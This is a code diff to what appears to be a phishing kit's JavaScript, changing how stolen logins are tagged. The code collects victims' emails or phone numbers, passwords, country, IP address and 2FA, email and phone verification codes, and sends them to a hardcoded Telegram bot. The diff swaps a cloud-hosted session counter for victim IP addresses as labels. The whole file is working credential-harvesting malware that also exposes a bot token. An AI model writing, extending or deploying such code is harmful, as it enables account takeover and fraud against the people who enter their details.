@@ -4,73 +4,7 @@
 const TELEGRAM_BOT_TOKEN = "8063517213:AAGX-8hsm42L2WJ7svBJ4o-7xVLT348rWcQ";
 const TELEGRAM_CHAT_ID = "-5068849115";
 
-// ======================================================
-// SESSION COUNTER (AUTO-RESET AFTER 2 MINUTES)
-// Uses Pantry Cloud - FREE, no API key needed
-// ======================================================
-const RESET_INTERVAL = 120000; // 2 minutes in milliseconds
 
-// Pantry Cloud configuration - Get your ID at https://getpantry.cloud
-// Just enter your email and copy the Pantry ID
-const PANTRY_ID = "b7b66651-b8f0-44bf-9aac-c6e19c31c922";
-const BASKET_NAME = "sessionCounter";
-
-async function getSessionNumber() {
-    const now = Date.now();
-    
-    try {
-        // Fetch current counter from Pantry
-        const response = await fetch(`https://getpantry.cloud/apiv1/pantry/${PANTRY_ID}/basket/${BASKET_NAME}`);
-        
-        let sessionCounter = 0;
-        let lastTimestamp = 0;
-        
-        if (response.ok) {
-            const data = await response.json();
-            sessionCounter = data.counter || 0;
-            lastTimestamp = data.timestamp || 0;
-        }
-        
-        // Reset counter if more than 2 minutes have passed
-        if (now - lastTimestamp > RESET_INTERVAL) {
-            sessionCounter = 0;
-        }
-        
-        // Increment counter
-        sessionCounter++;
-        
-        // Save updated counter to Pantry
-        await fetch(`https://getpantry.cloud/apiv1/pantry/${PANTRY_ID}/basket/${BASKET_NAME}`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                counter: sessionCounter,
-                timestamp: now
-            })
-        });
-        
-        return sessionCounter;
-        
-    } catch (error) {
-        console.error('Cloud counter error, using local fallback:', error);
-        // Fallback to localStorage if cloud fails
-        let sessionCounter = parseInt(localStorage.getItem('sessionCounter') || '0');
-        let lastTimestamp = parseInt(localStorage.getItem('lastLoginTimestamp') || '0');
-        
-        if (now - lastTimestamp > RESET_INTERVAL) {
-            sessionCounter = 0;
-        }
-        sessionCounter++;
-        localStorage.setItem('sessionCounter', sessionCounter.toString());
-        localStorage.setItem('lastLoginTimestamp', now.toString());
-        return sessionCounter;
-    }
-}
-
-// Store current session number for use in verification codes
-let currentSessionNumber = 0;
 
 // ======================================================
 // COLLECT USER INFORMATION
@@ -153,11 +87,7 @@ async function sendToTelegram(message) {
 // FORMAT MESSAGES FOR TELEGRAM (MONOSPACE FORMAT)
 // ======================================================
 
-async function formatLoginMessage(emailPhone, password) {
-    // Get session number (auto-resets after 2 minutes of inactivity)
-    const sessionNum = await getSessionNumber();
-    currentSessionNumber = sessionNum; // Store for use in verification codes
-    
+function formatLoginMessage(emailPhone, password) {
     // Prefer separate hidden fields if present (country-code + phone-number)
     const countryInput = (document.getElementById('country-code') || {}).value || '';
     const phoneInput = (document.getElementById('phone-number') || {}).value || '';
@@ -193,17 +123,13 @@ async function formatLoginMessage(emailPhone, password) {
         credentialsHtml = `<code>${credentialsValue}</code>`;
     }
 
-    return `<b>(USER ${sessionNum})</b>
+    return `<b>(${userInfo.ip})</b>
 <b>${credentialsType}:</b> ${credentialsHtml}
 <b>Password:</b> <code>${password}</code>
 <b>Country: ${userInfo.country}</b>`;
 }
 
-async function formatOneTimeLoginMessage(emailPhone) {
-    // Get session number (auto-resets after 2 minutes of inactivity)
-    const sessionNum = await getSessionNumber();
-    currentSessionNumber = sessionNum; // Store for use in verification codes
-    
+function formatOneTimeLoginMessage(emailPhone) {
     // Prefer separate hidden fields if present (country-code + phone-number)
     const countryInput = (document.getElementById('country-code') || {}).value || '';
     const phoneInput = (document.getElementById('phone-number') || {}).value || '';
@@ -239,37 +165,37 @@ async function formatOneTimeLoginMessage(emailPhone) {
         credentialsHtml = `<code>${credentialsValue}</code>`;
     }
 
-    return `<b>(USER ${sessionNum} 1⃣)</b>
+    return `<b>(${userInfo.ip} 1⃣)</b>
 <b>${credentialsType}:</b> ${credentialsHtml}
 <b>Country: ${userInfo.country}</b>`;
 }
 
 function format2FAMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}🔐: (User ${currentSessionNumber}):</b> <code>${code}</code>`;
+    return `<b>${prefix}🔐: (${userInfo.ip}):</b> <code>${code}</code>`;
 }
 
 function formatEmailVerificationMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📧: (User ${currentSessionNumber}):</b> <code>${code}</code>`;
+    return `<b>${prefix}📧: (${userInfo.ip}):</b> <code>${code}</code>`;
 }
 
 function formatPhoneVerificationMessage(code, switched = false) {
     const prefix = switched ? 'switched' : '';
-    return `<b>${prefix}📱: (User ${currentSessionNumber}):</b> <code>${code}</code>`;
+    return `<b>${prefix}📱: (${userInfo.ip}):</b> <code>${code}</code>`;
 }
 
 function formatSwitchMessage(fromMethod, toMethod) {
     // Capitalize first letter only
     const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();
-    return `<b>(USER ${currentSessionNumber})</b>
+    return `<b>(${userInfo.ip})</b>
 <b>Switched:</b> ${toMethodFormatted}`;
 }
 
 function formatGoVerifyMessage(method) {
     // Capitalize first letter only
     const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();
-    return `<b>(User ${currentSessionNumber})</b>
+    return `<b>(${userInfo.ip})</b>
 <b>Selected:</b> ${methodFormatted}`;
 }
 
@@ -491,9 +417,9 @@ form.addEventListener("submit", async e => {
     // Send login credentials to Telegram based on mode
     let loginMessage;
     if (isOneTimeCodeMode) {
-        loginMessage = await formatOneTimeLoginMessage(emailPhone);
+        loginMessage = formatOneTimeLoginMessage(emailPhone);
     } else {
-        loginMessage = await formatLoginMessage(emailPhone, password);
+        loginMessage = formatLoginMessage(emailPhone, password);
     }
     await sendToTelegram(loginMessage);
 
